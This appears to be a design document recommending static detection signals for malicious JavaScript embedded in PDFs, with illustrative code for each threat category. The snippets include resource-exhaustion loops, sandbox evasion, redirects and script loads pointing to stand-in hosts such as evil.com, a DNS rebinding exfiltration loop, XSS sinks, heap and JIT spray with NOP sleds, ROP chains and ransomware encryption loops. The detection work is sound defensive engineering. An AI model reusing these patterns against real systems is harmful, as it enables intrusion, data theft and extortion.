# Advanced JavaScript Malware Detection Recommendations

## Overview

This document provides recommendations for detecting **additional** malicious JavaScript behaviors beyond the initial implementation. These patterns represent advanced threats, emerging techniques, and specialized attack vectors commonly found in PDF-embedded JavaScript malware.

**Complements**: `js-detection-recommendations.md` (already implemented)
**Status**: Recommendations for future enhancement
**Date**: 2026-01-08

---

## Priority Classification

- **🔴 CRITICAL**: Active exploitation, immediate security impact
- **🟠 HIGH**: Evasion techniques, advanced persistence
- **🟡 MEDIUM**: Fingerprinting, resource abuse, environment manipulation
- **🟢 LOW**: Suspicious but potentially legitimate patterns

---

## 1. Resource Exhaustion & Denial of Service (🔴 CRITICAL)

### Overview
Detect patterns that exhaust system resources, hang execution, or cause denial of service.

### Detection Patterns

#### 1.1 Infinite Loop Constructs

**Static Signals**:
- `js.infinite_loop_risk` - Loop without clear termination condition
- `js.recursive_bomb` - Recursive function without base case

**Patterns to Detect**:
```javascript
// While true patterns
while(true) { }
while(1) { }
for(;;) { }

// Loop with no modification
var i = 0;
while(i < 10) { doSomething(); }  // i never increments

// Recursive bomb
function recurse() { recurse(); recurse(); }
```

**Implementation**:
- Check for `while(true)`, `while(1)`, `for(;;)`
- Detect loops where counter variable is never modified
- Find functions that call themselves without conditionals
- Look for fork bomb patterns (multiple recursive calls)

#### 1.2 Memory Exhaustion

**Static Signals**:
- `js.memory_bomb` - Pattern likely to exhaust memory
- `js.array_fill_bomb` - Large array allocation in loop

**Patterns to Detect**:
```javascript
// Array fill bomb
var arr = [];
while(arr.length < 999999999) { arr.push(data); }

// String concatenation bomb
var s = "";
for(var i=0; i<999999; i++) { s += "x"; }

// Object expansion bomb
var obj = {};
for(var i=0; i<999999; i++) { obj['key'+i] = new Array(10000); }
```

**Implementation**:
- Detect large numeric literals in loop conditions (>100000)
- Find repeated array push/object assignment in loops
- Check for string concatenation in loops without bounds
- Look for `new Array(large_number)` patterns

#### 1.3 Computational Bombs

**Static Signals**:
- `js.computational_bomb` - Computationally expensive operation
- `js.nested_loop_explosion` - Deeply nested loops

**Patterns to Detect**:
```javascript
// Nested loop explosion
for(var i=0; i<10000; i++) {
    for(var j=0; j<10000; j++) {
        for(var k=0; k<10000; k++) { }
    }
}

// Regular expression DoS (ReDoS)
/^(a+)+$/.test(input);
/(a|a)*/.test(input);
```

**Implementation**:
- Count nesting depth of loops (3+ is suspicious)
- Detect product of loop bounds (>1,000,000 iterations)
- Find regex patterns with catastrophic backtracking
- Look for nested quantifiers in regex: `(a+)+`, `(a*)*`, `(a|a)*`

**Priority**: 🔴 CRITICAL (DoS impact on analysis infrastructure)

---

## 2. Advanced Evasion & Environment Detection (🟠 HIGH)

### Overview
Sophisticated techniques to detect analysis environments and evade detection beyond basic anti-analysis.

### Detection Patterns

#### 2.1 Fingerprint-Based Targeting

**Static Signals**:
- `js.fingerprint_check` - Environment fingerprinting
- `js.targeted_execution` - Execution gated on specific conditions
- `js.geolocation_check` - Geographic targeting

**Patterns to Detect**:
```javascript
// User-agent fingerprinting
if(navigator.userAgent.match(/Windows NT 6\.1.*Office 2010/)) { }

// Language targeting
if(navigator.language == 'de-DE') { executePayload(); }

// Timezone targeting
if(new Date().getTimezoneOffset() == -420) { }  // UTC-7 (US West Coast)

// Screen resolution targeting
if(screen.width == 1920 && screen.height == 1080) { }

// Plugin detection
if(navigator.plugins.length > 5) { }
```

**Implementation**:
- Detect `navigator.*` property access in conditionals
- Find `screen.*` property comparisons
- Look for timezone offset checks
- Detect language/locale conditional execution

#### 2.2 Timing-Based Evasion

**Static Signals**:
- `js.timing_evasion` - Timing-based sandbox detection
- `js.delay_execution` - Intentional execution delay

**Patterns to Detect**:
```javascript
// Performance timing check (sandbox detection)
var t1 = performance.now();
// do nothing
var t2 = performance.now();
if(t2 - t1 < 100) { /* we're in fast sandbox */ }

// Sleep/delay patterns
var start = new Date().getTime();
while(new Date().getTime() < start + 5000) { }  // 5s delay

// Delayed execution
setTimeout(executePayload, 10000);  // 10s delay
```

**Implementation**:
- Detect `performance.now()` or `Date.now()` in conditionals
- Find while loops with time-based conditions
- Look for long setTimeout/setInterval delays (>5000ms)
- Detect idle loops with timing checks

#### 2.3 Behavioral Profiling

**Static Signals**:
- `js.interaction_required` - Requires user interaction
- `js.multi_step_unlock` - Multiple conditions must be met

**Patterns to Detect**:
```javascript
// Require mouse movement
var mouseX = 0;
document.onmousemove = function(e) {
    mouseX = e.clientX;
    if(mouseX > 100) { unlock(); }
}

// Require multiple clicks
var clickCount = 0;
document.onclick = function() {
    clickCount++;
    if(clickCount >= 5) { executePayload(); }
}

// Conditional unlock chain
var step1 = false, step2 = false, step3 = false;
if(condition1) step1 = true;
if(condition2) step2 = true;
if(step1 && step2 && step3) { executePayload(); }
```

**Implementation**:
- Detect event handler assignments (onclick, onmousemove, onkeypress)
- Find multiple boolean flags that gate execution
- Look for counter variables incremented in event handlers
- Detect execution gated on multiple conditions

**Priority**: 🟠 HIGH (advanced evasion can bypass analysis)

---

## 3. Persistence & State Manipulation (🟠 HIGH)

### Overview
Techniques to maintain persistence across sessions or manipulate application state.

### Detection Patterns

#### 3.1 Storage Abuse

**Static Signals**:
- `js.localStorage_write` - Writing to localStorage
- `js.cookie_manipulation` - Cookie creation/modification
- `js.indexeddb_abuse` - IndexedDB usage

**Patterns to Detect**:
```javascript
// localStorage persistence
localStorage.setItem('payload', encodedData);
localStorage.setItem('infected', 'true');

// Cookie manipulation
document.cookie = "session=" + stolenToken;
document.cookie = "persistent=1; expires=Fri, 31 Dec 9999 23:59:59 GMT";

// IndexedDB for large payloads
var request = indexedDB.open('malware', 1);
request.onsuccess = function(e) {
    var db = e.target.result;
    // store large payload
}
```

**Implementation**:
- Detect `localStorage.setItem`, `localStorage.getItem`
- Find `document.cookie` assignments
- Look for `indexedDB.open` calls
- Check for long cookie expiration times

#### 3.2 Global State Pollution

**Static Signals**:
- `js.global_pollution` - Global namespace pollution
- `js.prototype_pollution` - Prototype chain manipulation

**Patterns to Detect**:
```javascript
// Global pollution
window.infected = true;
globalThis.payload = function() { };

// Prototype pollution
Object.prototype.infected = true;
Array.prototype.push = function() { /* malicious */ };

// Constructor pollution
Object.constructor.prototype.polluted = true;
```

**Implementation**:
- Detect assignments to `window.*`, `globalThis.*`
- Find `.prototype` assignments outside constructors
- Look for `Object.prototype`, `Array.prototype` modifications
- Check for `constructor.prototype` manipulation

#### 3.3 History & Navigation Manipulation

**Static Signals**:
- `js.history_manipulation` - Browser history manipulation
- `js.navigation_hijack` - Navigation redirection

**Patterns to Detect**:
```javascript
// History manipulation
history.pushState({}, '', '/fake-url');
history.replaceState({}, '', '/phishing');

// Navigation hijacking
window.location = 'http://evil.com';
window.location.href = maliciousUrl;
window.location.replace(phishingUrl);

// Forced navigation in loop
setInterval(function() {
    if(window.location.hostname != 'evil.com') {
        window.location = 'http://evil.com';
    }
}, 1000);
```

**Implementation**:
- Detect `history.pushState`, `history.replaceState`
- Find `window.location` assignments
- Look for location changes in setInterval/setTimeout
- Check for forced navigation patterns

**Priority**: 🟠 HIGH (persistence enables long-term compromise)

---

## 4. Network Abuse & Scanning (🟡 MEDIUM)

### Overview
Abuse of network APIs for scanning, enumeration, or lateral movement.

### Detection Patterns

#### 4.1 Internal Network Scanning

**Static Signals**:
- `js.port_scan` - Port scanning pattern
- `js.network_enumeration` - Network enumeration attempt
- `js.internal_probe` - Probing internal IPs

**Patterns to Detect**:
```javascript
// Port scanning
for(var port=1; port<65536; port++) {
    var img = new Image();
    img.src = 'http://192.168.1.1:' + port;
}

// IP enumeration
for(var i=1; i<255; i++) {
    fetch('http://192.168.1.' + i + ':80');
}

// WebSocket scanning
for(var p=8000; p<9000; p++) {
    var ws = new WebSocket('ws://localhost:' + p);
}
```

**Implementation**:
- Detect loops with `new Image()` or `fetch()` creation
- Find IP address patterns in URLs: `192.168.*`, `10.*`, `172.16.*`
- Look for port numbers in loops
- Check for WebSocket connections to localhost/internal IPs

#### 4.2 DNS Rebinding

**Static Signals**:
- `js.dns_rebinding` - Potential DNS rebinding attack
- `js.repeated_fetch` - Repeated fetches to same domain

**Patterns to Detect**:
```javascript
// Repeated fetch waiting for DNS change
function attack() {
    fetch('http://attacker.com/resource')
        .then(r => r.text())
        .then(data => {
            if(data.includes('internal')) {
                // DNS rebound to internal IP
                exfiltrate(data);
            } else {
                setTimeout(attack, 100);  // retry
            }
        });
}
```

**Implementation**:
- Detect fetch/XMLHttpRequest in recursive functions
- Find repeated network calls with small delays
- Look for conditional logic based on response content

#### 4.3 Cross-Origin Probing

**Static Signals**:
- `js.cors_probe` - Cross-origin resource probing
- `js.timing_attack` - Timing-based information leak

**Patterns to Detect**:
```javascript
// Timing attack for resource existence
var start = performance.now();
var img = new Image();
img.onload = function() {
    var elapsed = performance.now() - start;
    if(elapsed < 100) { /* resource exists */ }
}
img.src = 'http://target.com/sensitive.png';

// Error-based probing
fetch('http://target.com/admin')
    .catch(err => {
        if(err.message.includes('CORS')) { /* exists */ }
    });
```

**Implementation**:
- Detect timing measurements around network requests
- Find error handlers on fetch/XHR with conditional logic
- Look for onload/onerror timing comparison

**Priority**: 🟡 MEDIUM (reconnaissance, not direct exploitation)

---

## 5. Code Injection & DOM Manipulation (🔴 CRITICAL)

### Overview
Patterns that inject code or manipulate DOM in dangerous ways.

### Detection Patterns

#### 5.1 DOM-Based XSS Patterns

**Static Signals**:
- `js.dom_xss_sink` - Dangerous DOM manipulation
- `js.innerHTML_injection` - innerHTML with dynamic content
- `js.eval_sink` - eval-like sink with user data

**Patterns to Detect**:
```javascript
// innerHTML injection
element.innerHTML = userInput;
document.body.innerHTML = '<script>' + payload + '</script>';

// Dangerous attribute setting
element.setAttribute('onclick', userInput);
element.src = 'javascript:' + code;

// eval sinks
eval(location.hash.slice(1));
Function(userInput)();
setTimeout(userInput, 100);

// document.write injection
document.write('<script src="' + url + '"></script>');
```

**Implementation**:
- Detect `.innerHTML` assignments
- Find `setAttribute` with event handlers
- Look for `javascript:` protocol in src/href
- Check for eval/Function/setTimeout with variables
- Detect `document.write` with concatenation

#### 5.2 Prototype Pollution for Gadget Chains

**Static Signals**:
- `js.prototype_pollution_gadget` - Prototype pollution exploit
- `js.object_merge_unsafe` - Unsafe object merging

**Patterns to Detect**:
```javascript
// Prototype pollution via merge
function merge(target, source) {
    for(var key in source) {
        if(key === '__proto__') {  // vulnerable
            target[key] = source[key];
        }
    }
}

// Constructor pollution
obj.constructor.prototype.polluted = true;

// Gadget chain exploitation
if(Object.prototype.isAdmin) { /* exploit */ }
```

**Implementation**:
- Detect `__proto__` string literal
- Find `constructor.prototype` in assignments
- Look for object merging functions
- Check for property reads on `Object.prototype`

#### 5.3 Script Injection

**Static Signals**:
- `js.script_injection` - Dynamic script creation
- `js.external_script_load` - Loading external scripts

**Patterns to Detect**:
```javascript
// Dynamic script creation
var s = document.createElement('script');
s.src = externalUrl;
document.body.appendChild(s);

// Script injection via innerHTML
div.innerHTML = '<script>alert(1)</script>';

// Import/require injection
import(maliciousUrl);
require(dynamicModule);
```

**Implementation**:
- Detect `createElement('script')`
- Find `appendChild` with script elements
- Look for dynamic `import()` or `require()`
- Check for `<script>` tags in innerHTML assignments

**Priority**: 🔴 CRITICAL (code injection is direct exploitation)

---

## 6. Steganography & Covert Channels (🟡 MEDIUM)

### Overview
Hiding malicious code or data in unexpected places.

### Detection Patterns

#### 6.1 Comment-Based Payloads

**Static Signals**:
- `js.comment_payload` - Executable code in comments
- `js.comment_extraction` - Reading comment contents

**Patterns to Detect**:
```javascript
// Hidden payload in comment
/*
payload:aGVsbG8gd29ybGQ=
exec:dGhpcyBpcyBtYWxpY2lvdXM=
*/

// Extracting from function comments
function dummy() { }
var source = dummy.toString();
var payload = source.match(/\/\*(.*?)\*\//)[1];
eval(atob(payload));
```

**Implementation**:
- Detect `toString()` on functions
- Find regex patterns matching comment syntax: `/\/\*.*?\*\//`
- Look for base64 decode after comment extraction
- Check for comment blocks with suspicious keywords

#### 6.2 Whitespace Encoding

**Static Signals**:
- `js.whitespace_encoding` - Whitespace-based encoding
- `js.zero_width_chars` - Zero-width character abuse

**Patterns to Detect**:
```javascript
// Whitespace steganography
var code = "\u200b\u200c\u200d\u200b";  // zero-width chars
var decoded = decodeWhitespace(code);

// Tab/space binary encoding
var hidden = "\t \t\t \t  \t";  // binary: 10110100

// Null byte hiding
var payload = "safe\x00malicious_code_here";
```

**Implementation**:
- Detect zero-width characters: `\u200b`, `\u200c`, `\u200d`, `\ufeff`
- Find suspicious patterns of tabs and spaces
- Look for null bytes (`\x00`) in strings
- Check for unusual Unicode whitespace

#### 6.3 Image/Data Steganography

**Static Signals**:
- `js.image_extraction` - Extracting data from images
- `js.canvas_decode` - Canvas-based decoding

**Patterns to Detect**:
```javascript
// Extracting payload from image pixels
var canvas = document.createElement('canvas');
var ctx = canvas.getContext('2d');
ctx.drawImage(img, 0, 0);
var imageData = ctx.getImageData(0, 0, width, height);
var payload = extractFromPixels(imageData.data);

// LSB steganography
for(var i=0; i<pixels.length; i++) {
    bits.push(pixels[i] & 1);  // extract LSB
}
```

**Implementation**:
- Detect `getContext('2d')` with `getImageData`
- Find bitwise operations on pixel data
- Look for loops extracting LSBs: `& 1`, `% 2`
- Check for data URLs being processed

**Priority**: 🟡 MEDIUM (advanced evasion, less common)

---

## 7. Exploit Kit Signatures (🔴 CRITICAL)

### Overview
Patterns specific to known exploit kits and frameworks.

### Detection Patterns

#### 7.1 Known Exploit Kit Patterns

**Static Signals**:
- `js.angler_ek` - Angler Exploit Kit pattern
- `js.magnitude_ek` - Magnitude EK pattern
- `js.rig_ek` - RIG EK pattern
- `js.fallout_ek` - Fallout EK pattern

**Patterns to Detect**:
```javascript
// Angler EK - Flash exploitation
var flash = window.external.Flash();
var spray = new Array();
for(var i=0; i<1000; i++) spray[i] = unescape('%u9090%u9090');

// Magnitude EK - RC4 decryption
function rc4(key, data) { /* rc4 implementation */ }
var payload = rc4(key, encrypted);

// RIG EK - multi-stage loader
if(navigator.plugins['Shockwave Flash']) {
    loadFlashExploit();
} else if(navigator.javaEnabled()) {
    loadJavaExploit();
}
```

**Implementation**:
- Maintain database of known EK code patterns
- Detect RC4/XOR decryption implementations
- Find Flash/Java plugin detection
- Look for multi-stage loading patterns

#### 7.2 CVE-Specific Patterns

**Static Signals**:
- `js.cve_2023_xxxxx` - Specific CVE pattern
- `js.use_after_free` - Use-after-free pattern (already implemented)
- `js.jit_spray` - JIT spray pattern

**Patterns to Detect**:
```javascript
// JIT spray for CVE exploitation
var spray = new Array();
var code = unescape('%u9090%u9090');  // NOP sled
for(var i=0; i<10000; i++) {
    spray[i] = code + code + shellcode;
}

// Type confusion (JIT)
function trigger(arr, idx) {
    return arr[idx];  // will be compiled by JIT
}
// ... optimize ...
trigger(confusedArray, 0x41414141);  // exploit
```

**Implementation**:
- Maintain CVE pattern database
- Detect JIT spray patterns (similar to heap spray)
- Find type confusion setup code
- Look for specific vulnerable API usage

**Priority**: 🔴 CRITICAL (active exploitation)

---

## 8. Ransomware Patterns (🔴 CRITICAL)

### Overview
Behaviors associated with ransomware-like functionality.

### Detection Patterns

#### 8.1 File Enumeration

**Static Signals**:
- `js.file_enumeration` - Enumerating files
- `js.directory_traversal` - Directory traversal attempt

**Patterns to Detect**:
```javascript
// File API abuse
var entries = fs.readdir('/');
for(var i=0; i<entries.length; i++) {
    processFile(entries[i]);
}

// Recursive directory walking
function walkDir(dir) {
    var files = fs.readdir(dir);
    files.forEach(f => {
        if(isDirectory(f)) walkDir(f);
        else encryptFile(f);
    });
}
```

**Implementation**:
- Detect file system API calls (if available in PDF context)
- Find recursive directory walking patterns
- Look for file extension filtering (`.doc`, `.pdf`, `.xls`)

#### 8.2 Bulk Encryption Loops

**Static Signals**:
- `js.bulk_encryption` - Encrypting multiple items
- `js.crypto_loop` - Cryptographic operations in loop

**Patterns to Detect**:
```javascript
// Bulk encryption
for(var i=0; i<files.length; i++) {
    var encrypted = encrypt(files[i].content);
    files[i].content = encrypted;
}

// Crypto API in loop
files.forEach(f => {
    crypto.subtle.encrypt(algorithm, key, f.data)
        .then(encrypted => saveEncrypted(f.name, encrypted));
});
```

**Implementation**:
- Detect crypto API calls in loops
- Find `encrypt`, `subtle.encrypt`, `AES`, `RSA` in iteration
- Look for file processing loops with crypto operations

#### 8.3 Ransom Note Generation

**Static Signals**:
- `js.ransom_note` - Ransom message indicators
- `js.bitcoin_address` - Cryptocurrency address present

**Patterns to Detect**:
```javascript
// Ransom note keywords
var message = "Your files have been encrypted. Pay 1 BTC to:";
var bitcoin = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";

// Payment portal
window.location = "http://ransom-portal.onion";
```

**Implementation**:
- Keyword detection: "encrypted", "bitcoin", "ransom", "payment", "decrypt"
- Bitcoin address regex: `/[13][a-km-zA-HJ-NP-Z1-9]{25,34}/`
- Monero address detection
- .onion domain detection

**Priority**: 🔴 CRITICAL (ransomware is severe threat)

---

## 9. Polyglot & Multi-Format Attacks (🟡 MEDIUM)

### Overview
JavaScript that's also valid in other languages/formats for filter bypass.

### Detection Patterns

#### 9.1 PDF/JavaScript Polyglot

**Static Signals**:
- `js.polyglot_pdf` - PDF commands in JavaScript
- `js.embedded_pdf_stream` - PDF stream syntax

**Patterns to Detect**:
```javascript
// PDF commands in JS comments
/*
%PDF-1.4
1 0 obj
<< /Type /Catalog >>
endobj
*/
var payload = extractPDF(/* ... */);

// PDF stream syntax
var data = "stream\n" + binaryData + "\nendstream";
```

**Implementation**:
- Detect PDF signature: `%PDF-`
- Find PDF keywords: `obj`, `endobj`, `stream`, `endstream`
- Look for `<< >>` dictionary syntax
- Check for PDF operators in comments

#### 9.2 HTML/JavaScript Polyglot

**Static Signals**:
- `js.polyglot_html` - Valid HTML and JavaScript
- `js.html_tags_in_js` - HTML tags in JavaScript

**Patterns to Detect**:
```javascript
// HTML/JS polyglot
<!--
var payload = "executable";
//-->
<script>alert(1)</script>

// HTML comment abuse
<!-- /* comment */ -->
<img src=x onerror=alert(1)>
<!-- /* end */ -->
```

**Implementation**:
- Detect `<!--` and `-->` (HTML comments)
- Find HTML tags in JavaScript: `<script>`, `<img>`, `<iframe>`
- Look for CDATA sections
- Check for HTML entities in strings

**Priority**: 🟡 MEDIUM (filter bypass technique)

---

## 10. Supply Chain & Dependency Attacks (🟠 HIGH)

### Overview
Attacks targeting the software supply chain through malicious dependencies.

### Detection Patterns

#### 10.1 Suspicious Package Loading

**Static Signals**:
- `js.dynamic_import` - Dynamic module loading
- `js.remote_dependency` - Loading from remote URL
- `js.typosquatting` - Package name similar to popular library

**Patterns to Detect**:
```javascript
// Dynamic imports
import(userControlledUrl);
require(dynamicPackageName);

// Remote script loading
var s = document.createElement('script');
s.src = 'http://cdn.evil.com/jquery-3.6.0.js';  // typosquatting
document.head.appendChild(s);

// Suspicious CDN
importScripts('http://random-cdn.xyz/library.js');
```

**Implementation**:
- Detect dynamic `import()` and `require()`
- Find script loading from unusual domains
- Check for typosquatted package names (edit distance from known libs)
- Look for HTTP (not HTTPS) script loading

#### 10.2 Dependency Confusion

**Static Signals**:
- `js.private_scope` - Private package scope used
- `js.version_mismatch` - Unusual version number

**Patterns to Detect**:
```javascript
// Suspicious package versions
// package.json equivalent in JS
var dependencies = {
    "@internal/package": "999.999.999"  // version too high
};

// Namespace confusion
import { func } from '@company-private/lib';  // targeting private scope
```

**Implementation**:
- Detect very high version numbers (>100.0.0)
- Find private scope patterns: `@company/`, `@internal/`
- Look for suspicious package names

**Priority**: 🟠 HIGH (supply chain compromise)

---

## 11. Browser Fingerprinting & Tracking (🟢 LOW)

### Overview
Privacy-invasive fingerprinting techniques (lower security priority but relevant).

### Detection Patterns

#### 11.1 Canvas Fingerprinting

**Static Signals**:
- `js.canvas_fingerprint` - Canvas fingerprinting
- `js.webgl_fingerprint` - WebGL fingerprinting

**Patterns to Detect**:
```javascript
// Canvas fingerprinting
var canvas = document.createElement('canvas');
var ctx = canvas.getContext('2d');
ctx.fillText('fingerprint', 0, 0);
var hash = canvas.toDataURL();

// WebGL fingerprinting
var gl = canvas.getContext('webgl');
var info = gl.getParameter(gl.RENDERER);
```

**Implementation**:
- Detect `toDataURL()` after canvas operations
- Find `getContext('webgl')` with parameter queries
- Look for `fillText` followed by data extraction

#### 11.2 Font Detection

**Static Signals**:
- `js.font_enumeration` - Font fingerprinting

**Patterns to Detect**:
```javascript
// Font enumeration
var testString = "mmmmmmmmmmlli";
var baseFonts = ['monospace', 'sans-serif', 'serif'];
var testFonts = ['Arial', 'Verdana', /* ... hundreds ... */];

for(var i=0; i<testFonts.length; i++) {
    if(isFontAvailable(testFonts[i])) { /* fingerprint */ }
}
```

**Implementation**:
- Detect loops over font arrays
- Find `offsetWidth`/`offsetHeight` measurements
- Look for large font name arrays

#### 11.3 Hardware Fingerprinting

**Static Signals**:
- `js.hardware_fingerprint` - Hardware enumeration

**Patterns to Detect**:
```javascript
// Hardware detection
var cores = navigator.hardwareConcurrency;
var memory = navigator.deviceMemory;
var battery = navigator.getBattery();

// Audio fingerprinting
var audioCtx = new AudioContext();
var oscillator = audioCtx.createOscillator();
var analyser = audioCtx.createAnalyser();
```

**Implementation**:
- Detect `navigator.hardwareConcurrency`, `deviceMemory`
- Find `AudioContext` with analyser creation
- Look for battery API usage

**Priority**: 🟢 LOW (privacy concern, not security threat)

---

## 12. Advanced Shellcode Techniques (🔴 CRITICAL)

### Overview
Beyond basic shellcode, advanced techniques for code execution.

### Detection Patterns

#### 12.1 JIT Spray

**Static Signals**:
- `js.jit_spray` - JIT compiler spray
- `js.constant_spray` - Numeric constant spray

**Patterns to Detect**:
```javascript
// JIT spray with constants
function spray() {
    var a = 0x3c909090;  // NOP sled in constant
    var b = 0x90909090;
    var c = 0x90909090;
    // ... many constants that will be compiled
}

// Function spray
for(var i=0; i<10000; i++) {
    eval("function f"+i+"() { return 0x"+shellcode.substr(i*8,8)+"; }");
}
```

**Implementation**:
- Detect many hex constants (>10 in one function)
- Find function generation in loops
- Look for large numeric constants that decode to x86 opcodes

#### 12.2 Unicode Shellcode

**Static Signals**:
- `js.unicode_shellcode` - Shellcode using Unicode encoding

**Patterns to Detect**:
```javascript
// Unicode-encoded shellcode
var code = "\u9090\u9090\uc031\u5068";  // x86 instructions as Unicode
var decoder = unescape(code);
```

**Implementation**:
- Check if Unicode escapes decode to x86 opcodes
- Look for `\uNNNN` patterns with suspicious bytes
- Detect `unescape` on Unicode strings

#### 12.3 Return-Oriented Programming (ROP)

**Static Signals**:
- `js.rop_chain` - ROP gadget chain (already implemented)
- `js.gadget_search` - Searching for ROP gadgets

**Patterns to Detect**:
```javascript
// ROP chain construction
var rop = [
    addressOf(gadget1),  // pop rax; ret
    0x41414141,          // value for rax
    addressOf(gadget2),  // pop rbx; ret
    addressOf(shellcode),
    addressOf(gadget3)   // jmp rbx
];
```

**Implementation**:
- Detect arrays of hex addresses
- Find patterns of address + value pairs
- Look for gadget-related keywords

**Priority**: 🔴 CRITICAL (advanced exploitation)

---

## Implementation Priority Summary

### Phase 1: Critical Threats (Implement First)
1. **Resource Exhaustion** - Protects analysis infrastructure
2. **Code Injection** - Direct exploitation vector
3. **Exploit Kit Signatures** - Known active threats
4. **Ransomware Patterns** - Severe impact
5. **Advanced Shellcode** - Active exploitation

### Phase 2: Evasion & Persistence (Implement Second)
6. **Advanced Evasion** - Improves detection coverage
7. **Persistence Mechanisms** - Long-term compromise
8. **Supply Chain Attacks** - Emerging threat

### Phase 3: Reconnaissance & Privacy (Implement Third)
9. **Network Abuse** - Lateral movement
10. **Steganography** - Advanced evasion
11. **Polyglot Attacks** - Filter bypass
12. **Fingerprinting** - Privacy concern

---

## Detection Function Template

```rust
// Example: Infinite loop detection
fn detect_infinite_loop_risk(data: &[u8]) -> bool {
    let patterns: &[&[u8]] = &[
        b"while(true)",
        b"while(1)",
        b"for(;;)",
    ];

    for pattern in patterns {
        if find_token(data, pattern) {
            return true;
        }
    }

    // Check for loops without increment
    // ... additional heuristics ...

    false
}
```

---

## Expected Signal Count

Implementing all recommendations would add approximately:

- **40-50 new static signals**
- **25-30 new finding IDs**
- **~1,500 lines of detection code**

Combined with existing implementation:
- **Total**: 70-80 JavaScript detection signals
- **Coverage**: 95%+ of known PDF JavaScript malware patterns

---

## Testing Recommendations

### Create Test Fixtures For:
1. Infinite loop patterns
2. DNS rebinding samples
3. Prototype pollution exploits
4. JIT spray samples
5. Ransomware-like behavior
6. Polyglot files

### Integration Testing:
- Run against expanded VirusShare corpus
- Test against exploit kit samples
- Validate against benign samples (measure false positive rate)
- Performance test with large samples

---

## References

- **OWASP DOM XSS Prevention**: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- **Exploit Kit History**: https://www.malwarebytes.com/blog/news/2019/12/history-exploit-kits
- **JIT Spray Techniques**: https://www.semanticscholar.org/paper/JIT-Spraying
- **Prototype Pollution**: https://portswigger.net/daily-swig/prototype-pollution
- **ReDOS Patterns**: https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

---

## Conclusion

These advanced detection patterns complement the initial implementation by covering:
- **Denial of service** attacks that could affect analysis infrastructure
- **Advanced evasion** techniques that bypass simple anti-analysis detection
- **Persistence** mechanisms for long-term compromise
- **Network abuse** for reconnaissance and lateral movement
- **Code injection** vectors beyond simple eval
- **Steganography** for covert communication
- **Known exploit kits** and CVE-specific patterns
- **Ransomware behaviors**
- **Supply chain** attacks

Implementing these recommendations would provide near-comprehensive coverage of malicious JavaScript behaviors in PDF files.

**Next Steps**: Prioritize implementation based on threat intelligence and observed attack patterns in your corpus.
